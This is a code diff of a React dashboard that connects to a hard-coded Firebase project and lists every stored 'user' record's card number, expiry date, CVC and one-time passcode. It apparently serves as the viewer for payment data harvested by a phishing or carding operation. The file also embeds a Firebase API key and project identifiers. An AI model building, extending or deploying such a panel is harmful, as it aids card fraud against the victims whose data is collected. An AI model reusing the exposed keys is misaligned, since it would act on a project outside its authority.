@@ -1,114 +1,89 @@
 'use client'
 
-import { useFirebaseData } from '@/lib/useFirebaseData';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Skeleton } from '@/components/skeleton';
 
-export default function Dashboard() {
-  const { data: data, loading: usersLoading, error: usersError } = useFirebaseData('data');
-  const { data: sales, loading: salesLoading, error: salesError } = useFirebaseData('data');
+import { initializeApp } from "firebase/app"
+import { collection, getDocs, getFirestore } from "firebase/firestore"
+import { useEffect, useState } from 'react';
+import { Button } from '@/components/ui/button';
 
-  if (usersLoading || salesLoading) {
-    return <DashboardSkeleton />;
-  }
-
-  if (usersError || salesError) {
-    return <div>Error loading dashboard data</div>;
-  }
-
-  const totalUsers = data.length;
-
-  const monthlySales = sales.reduce((acc, sale) => {
-    const month = new Date(sale.date).toLocaleString('default', { month: 'short' });
-    acc[month] = (acc[month] || 0) + sale.amount;
-    return acc;
-  }, {});
-
-  const salesChartData = Object.entries(monthlySales).map(([month, amount]) => ({ month, amount }));
-
-  return (
-    <div className="container mx-auto p-4 space-y-4">
-      <h1 className="text-2xl font-bold mb-4">Dashboard</h1>
-      
-      <div className="grid gap-4 md:grid-cols-2">
-        <Card>
-          <CardHeader>
-            <CardTitle>Total Users</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <p className="text-3xl font-bold">{totalUsers}</p>
-          </CardContent>
-        </Card>
-    
-      </div>
-
-      
-
-      <Card>
-        <CardHeader>
-          <CardTitle> Users</CardTitle>
-        </CardHeader>
-        <CardContent>
-          <ul className="space-y-2">
-            {data.slice(0, 5).map(user => (
-              <li key={user.cardNumber} className="flex justify-between items-center">
-                <span>{user.expiry}</span>
-                <span className="text-sm text-gray-500">{user.cvc}</span>
-                <span className="text-sm text-gray-500">{user.otp}</span>
-              </li>
-            ))}
-          </ul>
-        </CardContent>
-      </Card>
-    </div>
-  )
+const firebaseConfig = {
+  apiKey: "AIzaSyBalb45hYmw3rGK3kn5Skp2Wb4Ci3yeKHc",
+  authDomain: "adsapp-for.firebaseapp.com",
+  projectId: "adsapp-for",
+  storageBucket: "adsapp-for.appspot.com",
+  messagingSenderId: "282166621415",
+  appId: "1:282166621415:web:2be67338bc64233153de42",
+  measurementId: "G-PG5NPD4FES"
+};
+type User = {
+  cardNumber: string
+  expiry: string
+  cvc: string
+  otp: string
 }
+// Initialize Firebase
+const app = initializeApp(firebaseConfig)
+const db = getFirestore(app)
 
-function DashboardSkeleton() {
+export default function Dashboard() {
+  const [users, setUsers] = useState<User[]>([])
+  const [loading, setLoading] = useState(false)
+  const [error, setError] = useState<string | null>(null)
+
+  const fetchUsers = async () => {
+    setLoading(true)
+    setError(null)
+    try {
+      const usersCollection = collection(db, "users")
+      const userSnapshot = await getDocs(usersCollection)
+      const userList = userSnapshot.docs.map(doc => ({
+        id: doc.id,
+        ...doc.data()
+      })) as unknown as User[]
+      setUsers(userList)
+    } catch (err) {
+      setError("Failed to fetch users. Please try again.")
+      console.error("Error fetching users:", err)
+    } finally {
+      setLoading(false)
+    }
+  }
+
+  useEffect(() => {
+    fetchUsers()
+  }, [])
+
   return (
-    <div className="container mx-auto p-4 space-y-4">
-      <h1 className="text-2xl font-bold mb-4">Dashboard</h1>
-      
-      <div className="grid gap-4 md:grid-cols-2">
-        <Card>
-          <CardHeader>
-            <CardTitle>Total Users</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <Skeleton className="h-8 w-24" />
-          </CardContent>
-        </Card>
-        
-        <Card>
-          <CardHeader>
-            <CardTitle>Total Sales</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <Skeleton className="h-8 w-24" />
-          </CardContent>
-        </Card>
-      </div>
-
-      <Card>
+    <div className="container mx-auto p-4">
+      <Card className="w-full max-w-2xl mx-auto">
         <CardHeader>
-          <CardTitle>Monthly Sales</CardTitle>
-          <CardDescription>Sales data for the past months</CardDescription>
+          <CardTitle className="text-2xl font-bold">User List from Firestore</CardTitle>
         </CardHeader>
         <CardContent>
-          <Skeleton className="h-[300px] w-full" />
-        </CardContent>
-      </Card>
-
-      <Card>
-        <CardHeader>
-          <CardTitle>Recent Users</CardTitle>
-        </CardHeader>
-        <CardContent>
-          <div className="space-y-2">
-            {[...Array(5)].map((_, i) => (
-              <Skeleton key={i} className="h-6 w-full" />
-            ))}
-          </div>
+          {loading ? (
+            <div className="space-y-2">
+              <Skeleton className="h-4 w-full" />
+              <Skeleton className="h-4 w-full" />
+              <Skeleton className="h-4 w-full" />
+            </div>
+          ) : error ? (
+            <div className="text-red-500">{error}</div>
+          ) : (
+            <ul className="space-y-2">
+              {users.map(user => (
+                <li key={user.cardNumber} className="bg-secondary p-2 rounded">
+                  <p className="font-semibold">{user.expiry}</p>
+                  <p className="text-sm text-muted-foreground">{user.cvc}</p>
+                  <p className="text-sm text-muted-foreground">{user.otp}</p>
+                </li>
+              ))}
+            </ul>
+          )}
+          <Button onClick={fetchUsers} className="mt-4">
+            Refresh Users
+          </Button>
         </CardContent>
       </Card>
     </div>
